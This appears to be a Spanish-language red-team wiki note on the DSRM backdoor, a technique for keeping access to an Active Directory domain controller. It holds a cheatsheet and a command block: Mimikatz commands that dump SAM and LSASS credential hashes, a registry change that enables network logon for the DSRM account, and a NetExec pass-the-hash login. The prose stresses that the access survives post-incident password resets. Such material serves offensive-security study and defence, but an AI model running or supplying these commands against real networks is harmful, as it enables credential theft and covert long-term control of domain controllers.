---
aliases:
  - DSRM Backdoor
  - Directory Services Restore Mode
  - DSRM Abuse
tags:
  - technique/persistence
  - asset/active-directory
  - env/windows
  - cred/ntlm
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: Technique
linked:
  - "[[Pass-the-Hash]]"
  - "[[LSASS Dumping]]"
  - "[[Skeleton Key]]"
---
# DSRM Backdoor

**DSRM** (Directory Services Restore Mode) es el modo de recuperación de un DC; tiene una cuenta de administrador **local** cuyo password se setea al promover el DC y casi nunca rota. Esa cuenta es independiente de AD (vive en el SAM local del DC).

El backdoor: como DA, **sincronizás el hash de la cuenta DSRM con el de un usuario que controlás** (o lo conocés) y cambiás `DsrmAdminLogonBehavior=2` para permitir **login remoto** con esa cuenta → acceso persistente al DC vía Pass-the-Hash, sobreviviendo a resets de cuentas de dominio.

---

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `mimikatz # token::elevate ; lsadump::sam` (en el DC) | Hash de la cuenta DSRM (`Administrator` del SAM local) | Leer el hash actual. |
| `mimikatz # lsadump::sam /patch` o `sekurlsa::logonpasswords` | Hash DSRM desde LSASS/SAM | Alternativa. |
| `reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2` | Habilita login de la cuenta DSRM por red (no solo modo restore) | Activar el backdoor. |
| `Set-ADDSRMPassword` / `ntdsutil "set dsrm password"` | Setear el password DSRM a uno conocido | Control del hash. |
| `nxc smb $DC -u administrator -H <DSRM_HASH> --local-auth` | Login al DC con el hash DSRM (cuenta local) | Re-entry vía PtH. |

```text
:: En el DC, como DA ::
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam        :: leer hash DSRM (cuenta Administrator del SAM local del DC)

:: Re-entry (cuenta LOCAL del DC, por eso --local-auth)
nxc smb dc01 -u Administrator -H <DSRM_NTLM_HASH> --local-auth
```

---

## Overview

La cuenta DSRM es un **administrador local del DC** que no se gestiona como las cuentas de dominio → los resets masivos de credenciales post-incidente suelen **olvidarla**. Con `DsrmAdminLogonBehavior=2`, esa cuenta puede autenticarse por red (normalmente solo serviría en modo restore booteado).

**Por qué es buena persistencia:** sobrevive a reset de krbtgt, cambios de password de dominio y limpieza de cuentas AD. El defensor tiene que acordarse específicamente de rotar la password DSRM (`ntdsutil`).

> [!warning] Requiere DA + acceso al DC
> Necesitás leer el SAM local del DC (admin en el DC) y escribir el registro LSA. Es persistencia post-compromiso, no escalada.

> [!tip] Diferencia con [[Skeleton Key]]
> Skeleton Key parchea LSASS en memoria (se pierde al reiniciar el DC). DSRM es **persistente en disco** (registro + SAM) → sobrevive reboots.

---

## Recursos

- [The Hacker Recipes — DSRM](https://www.thehacker.recipes/ad/persistence/dsrm) — comandos y detección.
- [adsecurity.org — DSRM persistence](https://adsecurity.org/?p=1714) — Sean Metcalf, original.
